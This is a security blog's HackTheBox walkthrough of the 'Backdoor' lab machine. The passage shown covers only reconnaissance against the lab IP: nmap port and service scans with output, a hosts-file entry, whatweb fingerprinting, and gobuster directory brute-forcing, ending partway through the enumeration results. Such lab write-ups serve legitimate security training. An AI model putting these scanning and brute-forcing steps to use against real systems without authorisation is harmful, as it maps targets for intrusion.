<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="BACKDOOR (Linux) Walkthrough  Reconnaissance Let&amp;rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.125 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &amp;hellip;
 PORT 22 : running SSH (OpenSSH 8.2p1) PORT 80 : running HTTP (Apache httpd 2."><meta name=keywords content><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://an0nud4y.com/htb/htb-backgoor/><title>HackTheBox: Backdoor :: An0nud4y</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4dd687783188f49ad84dad46a495038b4e06a83febd3af9ef767c2f582389730.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="HackTheBox: Backdoor"><meta itemprop=description content="BACKDOOR (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.125 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
 PORT 22 : running SSH (OpenSSH 8.2p1) PORT 80 : running HTTP (Apache httpd 2."><meta itemprop=datePublished content="2022-05-15T00:00:00+00:00"><meta itemprop=dateModified content="2022-05-15T00:00:00+00:00"><meta itemprop=wordCount content="1659"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="HackTheBox: Backdoor"><meta name=twitter:description content="BACKDOOR (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.125 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
 PORT 22 : running SSH (OpenSSH 8.2p1) PORT 80 : running HTTP (Apache httpd 2."><meta property="og:title" content="HackTheBox: Backdoor"><meta property="og:description" content="BACKDOOR (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.125 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
 PORT 22 : running SSH (OpenSSH 8.2p1) PORT 80 : running HTTP (Apache httpd 2."><meta property="og:type" content="article"><meta property="og:url" content="https://an0nud4y.com/htb/htb-backgoor/"><meta property="article:published_time" content="2022-05-15T00:00:00+00:00"><meta property="article:modified_time" content="2022-05-15T00:00:00+00:00"><meta property="og:site_name" content="An0nud4y"><meta property="article:published_time" content="2022-05-15 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>S3cur!ty_Bl0g</span>
<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://an0nud4y.com/about>About</a></li><li><a href=https://an0nud4y.com/htb>HackTheBox</a></li><li><a href=https://an0nud4y.com/notes>Notes</a></li><li><a href=https://an0nud4y.com/resume>Resume</a></li><li><a href=https://an0nud4y.com/talks>Talks</a></li><li><a href=https://an0nud4y.com/writeups>Writeups</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41C32.4934 41 41 32.4934 41 22 41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=https://an0nud4y.com/htb/htb-backgoor/>HackTheBox: Backdoor</a></h2><div class=post-content><h1 id=backdoor-linux-walkthrough>BACKDOOR (Linux) Walkthrough</h1><p><img src=/assets/Pasted%20image%2020220317013403.png alt="assets/Pasted image 20220317013403.png"></p><hr><h1 id=reconnaissance>Reconnaissance</h1><p>Let&rsquo;s do a Quick Scan of the target using NMAP.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sV -sC -O -oA nmap/initial 10.10.11.125
</code></pre></div><ul><li><strong>-sC</strong> : run Default Nmap scripts</li><li><strong>-sV</strong> : detects service versions</li><li><strong>-O</strong> : detects OS</li><li><strong>-oA</strong> : output all formats and store in file *nmap/initial</li></ul><p>We got the following result &mldr;</p><ul><li><strong>PORT 22</strong> : running SSH (OpenSSH 8.2p1)</li><li><strong>PORT 80</strong> : running HTTP (Apache httpd 2.4.41)</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# nmap -sV -sC -O -oA nmap/initial 10.10.11.125
Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-03-17 01:31 EDT
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.125
Host is up <span style=color:#f92672>(</span>0.26s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>reset<span style=color:#f92672>)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>3072</span> b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
80/tcp open  http    Apache httpd 2.4.41 <span style=color:#f92672>(</span><span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span><span style=color:#f92672>)</span>
|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &amp;<span style=color:#75715e>#8211; Real-Life</span>
No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style=color:#f92672>)</span>.
TCP/IP fingerprint:
OS:SCAN<span style=color:#f92672>(</span>V<span style=color:#f92672>=</span>7.92%E<span style=color:#f92672>=</span>4%D<span style=color:#f92672>=</span>3/17%OT<span style=color:#f92672>=</span>22%CT<span style=color:#f92672>=</span>1%CU<span style=color:#f92672>=</span>37958%PV<span style=color:#f92672>=</span>Y%DS<span style=color:#f92672>=</span>2%DC<span style=color:#f92672>=</span>I%G<span style=color:#f92672>=</span>Y%TM<span style=color:#f92672>=</span>6232C7F
OS:3%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu<span style=color:#f92672>)</span>SEQ<span style=color:#f92672>(</span>SP<span style=color:#f92672>=</span>FB%GCD<span style=color:#f92672>=</span>1%ISR<span style=color:#f92672>=</span>10D%TI<span style=color:#f92672>=</span>Z%CI<span style=color:#f92672>=</span>Z%II<span style=color:#f92672>=</span>I%TS<span style=color:#f92672>=</span>A<span style=color:#f92672>)</span>OPS<span style=color:#f92672>(</span>
OS:O1<span style=color:#f92672>=</span>M505ST11NW7%O2<span style=color:#f92672>=</span>M505ST11NW7%O3<span style=color:#f92672>=</span>M505NNT11NW7%O4<span style=color:#f92672>=</span>M505ST11NW7%O5<span style=color:#f92672>=</span>M505ST11
OS:NW7%O6<span style=color:#f92672>=</span>M505ST11<span style=color:#f92672>)</span>WIN<span style=color:#f92672>(</span>W1<span style=color:#f92672>=</span>FE88%W2<span style=color:#f92672>=</span>FE88%W3<span style=color:#f92672>=</span>FE88%W4<span style=color:#f92672>=</span>FE88%W5<span style=color:#f92672>=</span>FE88%W6<span style=color:#f92672>=</span>FE88<span style=color:#f92672>)</span>ECN<span style=color:#f92672>(</span>
OS:R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>FAF0%O<span style=color:#f92672>=</span>M505NNSNW7%CC<span style=color:#f92672>=</span>Y%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%S<span style=color:#f92672>=</span>O%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AS
OS:%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T2<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>N<span style=color:#f92672>)</span>T3<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>N<span style=color:#f92672>)</span>T4<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%F<span style=color:#f92672>=</span>R%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T5<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>
OS:Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T6<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%F<span style=color:#f92672>=</span>
OS:R%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>T7<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=</span><span style=color:#f92672>)</span>U1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>N%T
OS:<span style=color:#f92672>=</span>40%IPL<span style=color:#f92672>=</span>164%UN<span style=color:#f92672>=</span>0%RIPL<span style=color:#f92672>=</span>G%RID<span style=color:#f92672>=</span>G%RIPCK<span style=color:#f92672>=</span>G%RUCK<span style=color:#f92672>=</span>G%RUD<span style=color:#f92672>=</span>G<span style=color:#f92672>)</span>IE<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DFI<span style=color:#f92672>=</span>N%T<span style=color:#f92672>=</span>40%CD<span style=color:#f92672>=</span>
OS:S<span style=color:#f92672>)</span>

Network Distance: <span style=color:#ae81ff>2</span> hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 43.06 seconds

</code></pre></div><p>Let&rsquo;s do a Full machine scan to make sure we are not skipping any ports or services on uncommon ports.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sC -sV -O -oA nmap/full 10.10.11.125 -p- -vvv
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# nmap -sC -sV -O -oA nmap/full 10.10.11.125 -p-

Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-03-18 23:00 EDT
Nmap scan report <span style=color:#66d9ef>for</span> www.backdoor.htb <span style=color:#f92672>(</span>10.10.11.125<span style=color:#f92672>)</span>
Host is up <span style=color:#f92672>(</span>0.34s latency<span style=color:#f92672>)</span>.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>3072</span> b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
80/tcp   open  http    Apache httpd 2.4.41 <span style=color:#f92672>(</span><span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span><span style=color:#f92672>)</span>
|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
|_http-title: Backdoor &amp;<span style=color:#75715e>#8211; Real-Life</span>
|_http-generator: WordPress 5.8.1
1337/tcp open  waste?
Warning: OSScan results may be unreliable because we could not find at least <span style=color:#ae81ff>1</span> open and <span style=color:#ae81ff>1</span> closed port
Aggressive OS guesses: Linux 4.15 - 5.6 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, Linux 3.1 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, Linux 3.2 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, AXIS 210A or <span style=color:#ae81ff>211</span> Network Camera <span style=color:#f92672>(</span>Linux 2.6.17<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, Linux 5.0 - 5.3 <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, Linux 5.3 - 5.4 <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, Linux 2.6.32 <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, ASUS RT-N56U WAP <span style=color:#f92672>(</span>Linux 3.4<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Linux 3.16 <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Linux 5.4 <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>
No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>test conditions non-ideal<span style=color:#f92672>)</span>.
Network Distance: <span style=color:#ae81ff>2</span> hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 35.85 seconds

</code></pre></div><p>Found One more port &mldr;</p><ul><li><strong>PORT 1337</strong> : running waste? (Unknown Service).</li></ul><p>Similarly Let&rsquo;s run a UDP Scan as well</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sU -O -oA nmap/full 10.10.11.125 -p- -vvv
</code></pre></div><p>No port found in UDP scan.</p><p>Let&rsquo;s Enumerate these Ports Further.</p><hr><h1 id=enumeration>Enumeration</h1><p>Port 22 is running SSH and don&rsquo;t have large attack surface and Port 1337 is running a unknown service. So its better to start enumeration with HTTP (80) Port.</p><h1 id=port-80-http>PORT 80 (HTTP)</h1><p>Let&rsquo;s add the hostname in hosts file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>echo <span style=color:#e6db74>&#34;10.10.11.125 www.backdoor.htb backdoor.htb&#34;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>Let&rsquo;s identify the website with whatweb.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# whatweb www.backdoor.htb

http://www.backdoor.htb <span style=color:#f92672>[</span><span style=color:#ae81ff>200</span> OK<span style=color:#f92672>]</span> Apache<span style=color:#f92672>[</span>2.4.41<span style=color:#f92672>]</span>, Country<span style=color:#f92672>[</span>RESERVED<span style=color:#f92672>]</span><span style=color:#f92672>[</span>ZZ<span style=color:#f92672>]</span>, Email<span style=color:#f92672>[</span>wordpress@example.com<span style=color:#f92672>]</span>, HTML5, HTTPServer<span style=color:#f92672>[</span>Ubuntu Linux<span style=color:#f92672>]</span><span style=color:#f92672>[</span>Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span><span style=color:#f92672>]</span>, IP<span style=color:#f92672>[</span>10.10.11.125<span style=color:#f92672>]</span>, JQuery<span style=color:#f92672>[</span>3.6.0<span style=color:#f92672>]</span>, MetaGenerator<span style=color:#f92672>[</span>WordPress 5.8.1<span style=color:#f92672>]</span>, PoweredBy<span style=color:#f92672>[</span>WordPress<span style=color:#f92672>]</span>, Script, Title<span style=color:#f92672>[</span>Backdoor &amp;<span style=color:#75715e>#8211; Real-Life], UncommonHeaders[link], WordPress[5.8.1]</span>

</code></pre></div><p>Website is running Apache 2.4.41 and Wordpress Version 5.8.1.</p><p>Let&rsquo;s visit the site to check if we can find anything interesting there.</p><p><img src=/assets/Pasted%20image%2020220318232247.png alt="assets/Pasted image 20220318232247.png"></p><p>There doesn&rsquo;t seem to be anything interesting.</p><p>Let&rsquo;s run the directory bruteforce to find some hidden directories using gobuster.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://www.backdoor.htb/ -t <span style=color:#ae81ff>100</span> -x php,html,jpg,txt --no-tls-validation

<span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span>
Gobuster v3.1.0
by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
<span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://www.backdoor.htb/
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 100
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   404
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Extensions:              php,html,jpg,txt
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
<span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span>
2022/03/18 23:28:40 Starting gobuster in directory enumeration mode
<span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span><span style=color:#f92672>=</span>
/index.php            <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://www.backdoor.htb/<span style=color:#f92672>]</span>
/wp-content           <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 325<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://www.backdoor.htb/wp-content/<span style=color:#f92672>]</span>
/wp-login.php         <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 5758<span style=color:#f92672>]</span>                                         
/license.txt          <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 19915<span style=color:#f92672>]</span>                                        
/wp-includes          <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 326<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://www.backdoor.htb/wp-includes/<span style=color:#f92672>]</span>
/readme.html          <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 7346<span style=color:#f92672>]</span> 

